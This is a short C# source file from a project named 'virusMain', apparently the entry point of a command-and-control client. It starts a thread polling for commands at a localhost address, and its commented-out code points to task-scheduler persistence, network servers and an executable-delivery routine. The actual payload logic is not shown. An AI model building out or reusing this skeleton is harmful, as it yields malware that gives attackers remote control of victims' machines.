using System;
using System.IO;
using System.Threading;
using Microsoft.Win32.TaskScheduler;


namespace virusMain
{
    class MainClass
    {
        static void Main(string[] args)
        {
            Update upd = new Update();
            //TcpServer tcp = new TcpServer();
            // Tasks test = new Tasks();
            //test.create("Test", 0, true);
            //update up = new update();
            //up.print();
            //int res = 0/*, res1 = 0, res2 = 0, res3 = 0, res4 = 0*/;
            Thread t1 = new Thread(() => { upd.CheckForCommands(1, "127.0.0.1"); });
            //Thread t1 = new Thread(() => { tcp.upgrade(); });
            //Thread t2 = new Thread(() => { Plus_1(); });
            //Thread t3 = new Thread(() => { res3 = Plus_2(4); });
            //Thread t4 = new Thread(() => { res4 = Plus_2(5); });

            //Запускаем вычисление в четыре потока
            t1.Start(); //t2.Start(); //t3.Start(); t4.Start();

            //Console.ReadLine();

            //Ожидаем завершение всех
            //t1.Join(); //t2.Join(); t3.Join(); t4.Join();


            //res = res1 + res2 + res3 + res4;// Результат всех вычислений суммируем, в данном случае ответ будет 22


            //UdpServer udp = new UdpServer();
            //udp.mainserver();

            //byte[] bytes = File.ReadAllBytes(@"C:\atiwin\ATIWinflash.exe");

            //string outpath = @"C:\temp\ATIWinflash.exe";
            //File.WriteAllBytes(outpath, bytes);
            //File.OpenText(outpath);
            //TcpClient tcp = new TcpClient();
            //tcp.GiveEXE();
        }
        static void Plus_2()
        {
            while (true)
            {
                Thread.Sleep(1000);
                Console.WriteLine("test");
            } 
        }// метод вычисления
        static void Plus_1()
        {
            while (true)
            {
                 var a = Console.ReadKey();
            }
        }// метод вычисления
    }
}
